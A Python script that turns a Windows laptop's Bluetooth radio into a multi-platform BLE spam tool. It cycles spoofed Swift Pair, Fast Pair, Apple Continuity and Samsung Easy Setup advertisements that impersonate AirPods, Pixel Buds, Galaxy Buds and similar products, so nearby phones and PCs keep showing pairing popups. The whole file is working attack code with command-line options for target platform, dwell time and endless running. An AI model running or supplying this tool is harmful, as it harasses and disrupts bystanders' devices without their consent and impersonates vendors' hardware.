"""
Multi-Protocol BLE Local Advertiser Module (High-Dwell Trigger Mode)
Supports:
 - Windows (Microsoft Swift Pair - Manufacturer ID 0x0006)
 - Android (Google Fast Pair - Service Data 0xFE2C)
 - Apple iOS (Continuity / AirPods Popups - Manufacturer ID 0x004C)
 - Samsung Galaxy (Easy Setup - Manufacturer ID 0x0075)

Runs directly on laptop Bluetooth hardware without requiring an ESP32 or external microcontrollers.
"""

import sys
import time
import argparse

try:
    from winrt.windows.devices.bluetooth.advertisement import (
        BluetoothLEAdvertisementPublisher,
        BluetoothLEManufacturerData,
        BluetoothLEAdvertisementDataSection
    )
    from winrt.windows.storage.streams import DataWriter
    WINRT_AVAILABLE = True
except ImportError:
    WINRT_AVAILABLE = False


# ==============================================================================
# PAYLOAD DEFINITIONS
# ==============================================================================

# Windows (Microsoft Swift Pair - Manufacturer ID 0x0006)
WINDOWS_SWIFT_PAIR_TARGETS = [
    "Surface Ergonomic Keyboard",
    "Xbox Wireless Controller",
    "Surface Headphones 2",
    "Surface Precision Mouse",
    "Surface Arc Mouse",
    "Surface Earbuds",
    "Microsoft Presenter+",
    "Microsoft Audio Dock"
]

# Android (Google Fast Pair Model IDs - Service UUID 0xFE2C)
ANDROID_FAST_PAIR_TARGETS = [
    ("DAE096", "adidas RPT-02 SOL"),
    ("002000", "AIAIAI TMA-2"),
    ("038F16", "Beats Studio Buds"),
    ("F7D74B", "Google Pixel Buds"),
    ("8B3060", "Google Pixel Buds Pro"),
    ("000000", "Generic Fast Pair Device"),
    ("020000", "JBL Live 300TWS"),
    ("054231", "Sony WF-1000XM4")
]

# Apple iOS (Continuity Popups - Manufacturer ID 0x004C)
APPLE_CONTINUITY_TARGETS = [
    ("0E20", "AirPods Pro"),
    ("0A20", "AirPods Max"),
    ("0220", "AirPods 1st Gen"),
    ("0F20", "AirPods 2nd Gen"),
    ("1320", "AirPods 3rd Gen"),
    ("1420", "AirPods Pro 2nd Gen"),
    ("0B20", "Powerbeats Pro")
]

# Samsung Galaxy (Easy Setup - Manufacturer ID 0x0075)
SAMSUNG_EASY_SETUP_TARGETS = [
    ("4209010203040506", "Galaxy Buds Pro"),
    ("4209020203040506", "Galaxy Watch 4"),
    ("4209030203040506", "Galaxy Buds Live")
]


# ==============================================================================
# PUBLISHER BUILDERS
# ==============================================================================

def build_swiftpair_publisher(device_name: str) -> BluetoothLEAdvertisementPublisher:
    """Builds a Microsoft Swift Pair (Windows) BLE advertisement."""
    publisher = BluetoothLEAdvertisementPublisher()
    m_data = BluetoothLEManufacturerData()
    m_data.company_id = 0x0006  # Microsoft Company ID

    writer = DataWriter()
    writer.write_byte(0x03)  # Swift Pair Beacon ID
    writer.write_byte(0x00)  # Subscenario ID
    writer.write_byte(0x80)  # Flags / RSSI Byte

    name_bytes = device_name.encode('utf-8')
    writer.write_bytes(name_bytes)

    m_data.data = writer.detach_buffer()
    publisher.advertisement.manufacturer_data.append(m_data)
    return publisher


def build_fastpair_publisher(model_id_hex: str) -> BluetoothLEAdvertisementPublisher:
    """Builds a Google Fast Pair (Android) BLE advertisement."""
    publisher = BluetoothLEAdvertisementPublisher()
    section = BluetoothLEAdvertisementDataSection()
    section.data_type = 0x16  # Service Data 16-bit UUID
    writer = DataWriter()
    writer.write_byte(0x2C)   # 0xFE2C in Little-Endian (0x2C, 0xFE)
    writer.write_byte(0xFE)
    writer.write_bytes(bytes.fromhex(model_id_hex))  # 3-byte model ID

    section.data = writer.detach_buffer()
    publisher.advertisement.data_sections.append(section)
    return publisher


def build_apple_publisher(device_type_hex: str) -> BluetoothLEAdvertisementPublisher:
    """Builds an Apple Continuity (iOS) BLE advertisement."""
    publisher = BluetoothLEAdvertisementPublisher()
    m_data = BluetoothLEManufacturerData()
    m_data.company_id = 0x004C  # Apple Inc. Company ID

    writer = DataWriter()
    # Continuity Header (0x07 0x19 0x01)
    writer.write_byte(0x07)
    writer.write_byte(0x19)
    writer.write_byte(0x01)
    writer.write_bytes(bytes.fromhex(device_type_hex))  # 2-byte device code
    writer.write_bytes(bytes.fromhex("554433221100"))  # Status / Battery payload bytes

    m_data.data = writer.detach_buffer()
    publisher.advertisement.manufacturer_data.append(m_data)
    return publisher


def build_samsung_publisher(payload_hex: str) -> BluetoothLEAdvertisementPublisher:
    """Builds a Samsung Easy Setup BLE advertisement."""
    publisher = BluetoothLEAdvertisementPublisher()
    m_data = BluetoothLEManufacturerData()
    m_data.company_id = 0x0075  # Samsung Electronics Company ID

    writer = DataWriter()
    writer.write_bytes(bytes.fromhex(payload_hex))

    m_data.data = writer.detach_buffer()
    publisher.advertisement.manufacturer_data.append(m_data)
    return publisher


# ==============================================================================
# MAIN BROADCAST LOOP
# ==============================================================================

def run_multi_protocol_spam(mode: str = "all", dwell_seconds: float = 2.5, duration_seconds: int = 40):
    print("=" * 75)
    print(" [Multi-Protocol BLE Local Advertiser - Trigger Mode] ")
    print(f" Target Mode        : {mode.upper()}")
    print(f" Dwell Time / Target: {dwell_seconds} seconds")
    print(f" Total Duration     : {duration_seconds}s (0 = infinite)")
    print("=" * 75)

    if not WINRT_AVAILABLE:
        print("[!] Error: WinRT Python bindings not available.")
        return

    publishers = []

    if mode in ("windows", "all"):
        for dev_name in WINDOWS_SWIFT_PAIR_TARGETS:
            publishers.append((f"Windows SwiftPair ({dev_name})", build_swiftpair_publisher(dev_name)))

    if mode in ("android", "all"):
        for model_id, name in ANDROID_FAST_PAIR_TARGETS:
            publishers.append((f"Android FastPair ({name})", build_fastpair_publisher(model_id)))

    if mode in ("ios", "apple", "all"):
        for dev_code, name in APPLE_CONTINUITY_TARGETS:
            publishers.append((f"iOS Continuity ({name})", build_apple_publisher(dev_code)))

    if mode in ("samsung", "all"):
        for payload, name in SAMSUNG_EASY_SETUP_TARGETS:
            publishers.append((f"Samsung EasySetup ({name})", build_samsung_publisher(payload)))

    start_time = time.time()
    iteration = 0

    try:
        while True:
            tag, pub = publishers[iteration % len(publishers)]
            iteration += 1

            print(f"[{iteration}] Broadcasting payload -> {tag} (Dwell: {dwell_seconds}s)")
            pub.start()
            time.sleep(dwell_seconds)
            pub.stop()

            if duration_seconds > 0 and (time.time() - start_time) >= duration_seconds:
                print(f"\n[+] Completed {duration_seconds}s multi-protocol advertising session.")
                break

    except KeyboardInterrupt:
        print("\n[!] Broadcasting stopped by user.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Multi-Protocol BLE Local Advertiser")
    parser.add_argument("--mode", type=str, choices=["windows", "android", "ios", "samsung", "all"], default="all",
                        help="Target platform mode: windows, android, ios, samsung, or all (default: all)")
    parser.add_argument("--dwell", type=float, default=2.5, help="Dwell duration per device payload in seconds (default: 2.5s)")
    parser.add_argument("--duration", type=int, default=40, help="Total duration in seconds (default: 40s, 0 for infinite)")
    args = parser.parse_args()

    run_multi_protocol_spam(mode=args.mode, dwell_seconds=args.dwell, duration_seconds=args.duration)
